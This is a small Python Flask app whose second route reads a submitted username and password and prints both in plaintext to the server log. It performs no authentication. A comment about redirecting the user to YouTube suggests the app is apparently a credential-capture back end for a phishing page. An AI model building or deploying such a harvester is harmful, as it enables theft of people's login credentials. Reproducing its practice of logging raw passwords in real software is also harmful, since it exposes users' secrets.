from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    
    # Redirect the user to YouTube
    return render_template("index.html")

@app.route("/index2.html", methods=["GET", "POST"])
def goto():
    # Get the USER value from the form
    user_value = request.form.get('USER')
    pser_value = request.form.get('PASSWORD')
    
    # Print the content of USER to the server log
    print(f"User content: {user_value}")
    print(f"Password content: {pser_value}")
    return render_template("index2.html")

if __name__ == "__main__":
    app.run(debug=True)
